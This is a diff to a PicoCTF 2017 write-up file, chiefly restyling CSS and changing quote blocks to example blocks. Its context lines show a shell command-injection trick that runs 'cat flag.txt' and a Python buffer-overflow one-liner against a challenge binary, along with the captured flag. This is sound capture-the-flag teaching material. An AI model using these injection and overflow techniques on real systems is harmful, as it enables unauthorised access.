@@ -1,6 +1,8 @@
 #+TITLE: PicoCTF 2017
 #+OPTIONS:  toc:4 
+
 #+BEGIN_EXPORT html
+<link href="https://fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet"> 
 <style type="text/css">
 .h3, h3 {
     font-size: 25px;
@@ -9,6 +11,60 @@
 .h4, h4 {
     font-size: 21px;
     padding: 22px
+}
+
+/* All levels of nav */
+.bs-docs-sidebar .nav > li > a {
+    display: block;
+    padding: 4px 20px;
+    font-size: 14px;
+    font-weight: 500;
+    color: #999;
+}
+.bs-docs-sidebar .nav > li > a:hover,
+.bs-docs-sidebar .nav > li > a:focus {
+    padding-left: 19px;
+    color: #2bbc8a;
+ text-decoration: none;
+    background-color: transparent;
+    border-left: 1px solid #2bbc8a;
+ }
+.bs-docs-sidebar .nav > .active > a,
+.bs-docs-sidebar .nav > .active:hover > a,
+.bs-docs-sidebar .nav > .active:focus > a {
+    padding-left: 18px;
+    font-weight: bold;
+    color: #2bbc8a;
+    background-color: transparent;
+    border-left: 2px solid #2bbc8a;
+ }
+body {
+color: #c9cacc;
+background-color: #1d1f21;
+font-family: "Source Code Pro" , "Menlo", "Meslo LG", monospace;
+}
+a {
+	color: #2bbc8a;
+	text-decoration: none;
+}
+a:focus, a:hover {
+	color: #2bbc8a;
+	text-decoration: underline;
+}
+pre {
+	color: #d1d9e1;
+	background-color: #212326;
+	padding-left: 40px;
+	padding-top: 20px;
+	padding-bottom: 20px;
+        border: 1px solid #212326;
+font-family: "Source Code Pro" , "Menlo", "Meslo LG", monospace;
+}
+code {
+	background-color: #212326;
+}
+footer {
+	background-color: #212326;
 }
 </style>
 
@@ -859,7 +915,8 @@ System will run exactly what the program gives it
 Solution : 
 
 running the binary file 
-#+BEGIN_QUOTE
+
+#+BEGIN_EXAMPLE
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
                _                                        
               //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~     
@@ -878,11 +935,12 @@ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
  //                                                     
 
 
-#+END_QUOTE
+#+END_EXAMPLE
 
 While giving random input i realized that giving " gives an error
 
-#+BEGIN_QUOTE
+#+BEGIN_EXAMPLE
+
 "
                _                                        
               //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~     
@@ -901,7 +959,7 @@ sh: 14: //: Permission denied
 sh: 15: //: Permission denied
 sh: 17: Syntax error: Unterminated quoted string
 
-#+END_QUOTE
+#+END_EXAMPLE
 
 From the error we can identify that all the lines after is beeing executed and we can give any input , giving "cat flag.txt , tells
 us the flag
@@ -1001,12 +1059,11 @@ and if input is larger that the variable size it keeps on writing data after the
 we can overwrite it's value.
 
 Exploit Code
-
-#+BEGIN_QUOTE
+#+BEGIN_EXAMPLE
 (python -c "print 'A'*16 + '\x20\npassword\n' "; cat - ) | ./vrgearconsole 
-#+END_QUOTE
+#+END_EXAMPLE
+#+BEGIN_EXAMPLE
 
-#+BEGIN_QUOTE
 +----------------------------------------+
 |                                        |
 |                                        |
@@ -1035,7 +1092,7 @@ The flag is in "flag.txt".
 cat flag.txt
 da1e62f3da550878ed92d3d55d61fe7d
 
-#+END_QUOTE
+#+END_EXAMPLE
 
 * Level 3
 ** Reversing 
